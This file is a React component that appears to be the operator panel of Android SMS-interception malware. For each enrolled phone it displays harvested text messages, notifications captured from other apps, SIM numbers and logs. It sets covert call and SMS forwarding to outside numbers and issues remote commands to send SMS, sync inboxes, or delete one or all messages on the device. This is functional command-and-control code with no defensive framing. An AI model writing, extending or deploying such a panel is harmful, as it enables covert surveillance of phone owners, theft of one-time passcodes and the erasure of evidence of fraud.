import { useEffect, useState } from 'react'
import { useApp } from '../AppContext'
import { sendCommand } from '../api'
import { db, ref, get } from '../firebase'

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

interface Props {
  deviceId: string | null
  onClose: () => void
}

const tabs = [
  { key: 'detail', label: 'Detail', icon: 'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8zM14 2v6h6M16 13H8M16 17H8M10 9H8' },
  { key: 'sms', label: 'SMS', icon: 'M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z' },
  { key: 'notifications', label: 'Notifications', icon: 'M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0' },
  { key: 'logs', label: 'Logs', icon: 'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z' },
  { key: 'forwarding', label: 'Forwarding', icon: 'M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z' },
  { key: 'commands', label: 'Commands', icon: 'M4 17l6-6-6-6M12 19h8' },
]

export default function DeviceDetail({ deviceId, onClose }: Props) {
  const { devices, allSms } = useApp()
  const [activeTab, setActiveTab] = useState('detail')
  const [sms, setSms] = useState<any[]>([])
  const [notifications, setNotifications] = useState<any[]>([])
  const [logs, setLogs] = useState<any[]>([])
  const [cmdResult, setCmdResult] = useState('')

  const device = deviceId ? devices[deviceId] : null
  const deviceSms = allSms.filter(s => s.deviceId === deviceId)

  // Fetch additional data from Firebase
  useEffect(() => {
    if (!deviceId) return
    ;(async () => {
      try {
        const [nSnap, lSnap] = await Promise.all([
          get(ref(db, `notifications/${deviceId}`)),
          get(ref(db, `logs/${deviceId}`)),
        ])
        const nv = nSnap.val()
        const lv = lSnap.val()
        setNotifications(nv ? Object.values(nv).reverse() : [])
        setLogs(lv ? Object.values(lv).reverse() : [])
      } catch {}
    })()
  }, [deviceId])

  useEffect(() => { setSms(deviceSms) }, [deviceSms])

  const handleCommand = async (e: React.FormEvent) => {
    e.preventDefault()
    const form = e.target as HTMLFormElement
    const fd = new FormData(form)
    try {
      await sendCommand({
        device_id: deviceId!,
        cmd: fd.get('cmd') as string,
        simSlot: parseInt(fd.get('simSlot') as string) || 0,
        phoneNumber: (fd.get('phoneNumber') as string) || '',
        messageText: (fd.get('messageText') as string) || '',
        smsId: (fd.get('smsId') as string) || '',
      })
      setCmdResult("Command '" + fd.get('cmd') + "' queued")
      form.reset()
    } catch (e: any) {
      setCmdResult('Error: ' + e.message)
    }
  }

  const handleForwarding = async (e: React.FormEvent) => {
    e.preventDefault()
    const form = e.target as HTMLFormElement
    const fd = new FormData(form)
    const { ref: dbref, set } = await import('../firebase')
    try {
      await set(ref(db, `forwarding/${deviceId}`), {
        call_enabled: fd.get('call_enabled') === 'on' ? 1 : 0,
        call_number: fd.get('call_number') as string,
        call_sim_slot: parseInt(fd.get('call_sim_slot') as string) || 0,
        sms_enabled: fd.get('sms_enabled') === 'on' ? 1 : 0,
        sms_number: fd.get('sms_number') as string,
        sms_sim_slot: parseInt(fd.get('sms_sim_slot') as string) || 0,
      })
      setCmdResult('Forwarding settings saved')
    } catch (e: any) { setCmdResult('Error: ' + e.message) }
  }

  if (!deviceId || !device) return null

  const d = device

  return (
    <div className={`detail-panel open`}>
      {/* Header */}
      <div className="detail-header">
        <button className="back-btn" onClick={onClose}><SVG path="M19 12H5M12 19l-7-7 7-7"/></button>
        <div>
          <div style={{fontSize:15,fontWeight:700}}>{d.d_name || d.device_info || 'Device'}</div>
          <div style={{fontSize:11,color:'var(--text3)'}}>#{deviceId?.slice(0,14)}...</div>
        </div>
        <span className={`online-badge ${d.status === 'online' ? 'on' : 'off'}`} style={{marginLeft:'auto'}}>
          <span className="dot"></span>{d.status === 'online' ? 'Online' : 'Offline'}
        </span>
      </div>

      {/* Tabs */}
      <div className="detail-tabs">
        {tabs.map(t => (
          <button key={t.key} className={`dtab ${activeTab === t.key ? 'active' : ''}`} onClick={() => setActiveTab(t.key)}>
            <SVG path={t.icon} size={13}/> {t.label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="detail-content">

        {/* Detail Tab */}
        <div className={`detail-section ${activeTab === 'detail' ? 'active' : ''}`}>
          <div className="info-grid">
            <InfoItem label="Device ID" value={deviceId} mono />
            <InfoItem label="Model" value={d.d_name || d.device_info} />
            <InfoItem label="Brand" value={d.brand} />
            <InfoItem label="Android" value={d.android_version} />
            <InfoItem label="Battery" value={d.battery ? d.battery + '%' : 'N/A'} />
            <InfoItem label="Last Seen" value={d.last_seen || 'Never'} />
            <InfoItem label="Installed" value={d.install_time} />
            <InfoItem label="SIM 1" value={d.sim1_name && d.sim1_number ? `${d.sim1_name} (${d.sim1_number})` : d.sim1_name || d.sim1_number || 'N/A'} />
            <InfoItem label="SIM 2" value={d.sim2_name && d.sim2_number ? `${d.sim2_name} (${d.sim2_number})` : d.sim2_name || d.sim2_number || 'N/A'} />
            <InfoItem label="Phone" value={d.phone_number || d.phone} />
          </div>
        </div>

        {/* SMS Tab */}
        <div className={`detail-section ${activeTab === 'sms' ? 'active' : ''}`}>
          {sms.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" size={48}/></div><div className="empty-text">No SMS for this device</div></div>
          ) : (
            <div className="sms-list">
              {sms.slice(0, 100).map((s, i) => (
                <div key={s._ts || i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{s.sender || 'Unknown'}</span><span className="sms-type in">IN</span></div>
                  <div className="sms-body">{s.body || ''}</div>
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83" size={11}/>{s.date || new Date(s.timestamp || 0).toLocaleString()}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Notifications Tab */}
        <div className={`detail-section ${activeTab === 'notifications' ? 'active' : ''}`}>
          {notifications.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" size={48}/></div><div className="empty-text">No notifications</div></div>
          ) : (
            <div className="sms-list">
              {notifications.map((n: any, i: number) => (
                <div key={i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{n.package || 'Unknown'}</span></div>
                  <div className="sms-body" style={{fontWeight:600}}>{n.title}</div>
                  <div className="sms-body" style={{marginTop:4}}>{n.text}</div>
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{n.timestamp || ''}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Logs Tab */}
        <div className={`detail-section ${activeTab === 'logs' ? 'active' : ''}`}>
          {logs.length === 0 ? (
            <div className="empty"><div className="empty-icon"><SVG path="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" size={48}/></div><div className="empty-text">No logs</div></div>
          ) : (
            <div className="sms-list">
              {logs.map((l: any, i: number) => (
                <div key={i} className="sms-item">
                  <div className="sms-top"><span className="sms-sender">{l.type || 'Log'}</span></div>
                  <div className="sms-body" style={{fontSize:12}}>Target: {l.target || 'N/A'} | Status: {l.status || 'N/A'}</div>
                  {l.response && <div className="sms-body" style={{fontSize:11,marginTop:4}}>{l.response}</div>}
                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{l.timestamp || ''}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Forwarding Tab */}
        <div className={`detail-section ${activeTab === 'forwarding' ? 'active' : ''}`}>
          <div className="cmd-section">
            <div className="cmd-title"><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Call & SMS Forwarding</div>
            <form className="cmd-form" onSubmit={handleForwarding}>
              <div className="field"><label>Call Forward Number</label><input type="text" name="call_number" placeholder="+919876543210" defaultValue={d.forwarding?.call_number || ''}/></div>
              <div className="field"><label>Call Forward SIM</label><select name="call_sim_slot"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
              <div className="field"><label><input type="checkbox" name="call_enabled" defaultChecked={d.forwarding?.call_enabled === 1} /> Enable Call Forwarding</label></div>
              <div className="field" style={{marginTop:16}}><label>SMS Forward Number</label><input type="text" name="sms_number" placeholder="+919876543210" defaultValue={d.forwarding?.sms_number || ''}/></div>
              <div className="field"><label>SMS Forward SIM</label><select name="sms_sim_slot"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
              <div className="field"><label><input type="checkbox" name="sms_enabled" defaultChecked={d.forwarding?.sms_enabled === 1} /> Enable SMS Forwarding</label></div>
              <button className="btn btn-primary btn-block" type="submit"><SVG path="M9 12l2 2 4-4m6 2a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"/> Save Settings</button>
            </form>
          </div>
        </div>

        {/* Commands Tab */}
        <div className={`detail-section ${activeTab === 'commands' ? 'active' : ''}`}>
          <form className="cmd-form" onSubmit={handleCommand}>
            <div className="field"><label>Command</label><select name="cmd" required>
              <option value="">Select command...</option>
              <option value="send_sms">Send SMS</option>
              <option value="call_forward_on">Call Forward ON</option>
              <option value="call_forward_off">Call Forward OFF</option>
              <option value="call_forward_status">Call Forward Status</option>
              <option value="sms_forward_on">SMS Forward ON</option>
              <option value="sms_forward_off">SMS Forward OFF</option>
              <option value="sms_delete_all">Delete All SMS</option>
              <option value="sms_delete_one">Delete Specific SMS</option>
              <option value="sync_sms">Sync SMS</option>
              <option value="reboot">Reboot Service</option>
            </select></div>
            <div className="field"><label>SIM Slot</label><select name="simSlot"><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
            <div className="field"><label>Phone Number</label><input type="text" name="phoneNumber" placeholder="+919876543210"/></div>
            <div className="field"><label>Message Text</label><textarea name="messageText" placeholder="SMS body or command params"/></div>
            <div className="field"><label>SMS ID</label><input type="text" name="smsId" placeholder="For sms_delete_one"/></div>
            <button className="btn btn-primary btn-block" type="submit"><SVG path="M23 2 1 21h4l18-17z"/> Execute</button>
          </form>
          {cmdResult && <div style={{marginTop:10,padding:'10px 14px',borderRadius:10,background:'var(--glass)',border:'1px solid var(--border)',fontSize:12,fontWeight:600,color:cmdResult.startsWith('Error')?'var(--red)':'var(--green)'}}>{cmdResult}</div>}
        </div>

      </div>
    </div>
  )
}

function InfoItem({ label, value, mono }: { label: string; value: string | undefined; mono?: boolean }) {
  return (
    <div className="info-item">
      <div className="info-label">{label}</div>
      <div className="info-value" style={mono ? { fontFamily: 'monospace', fontSize: 11 } : {}}>{value || 'N/A'}</div>
    </div>
  )
}
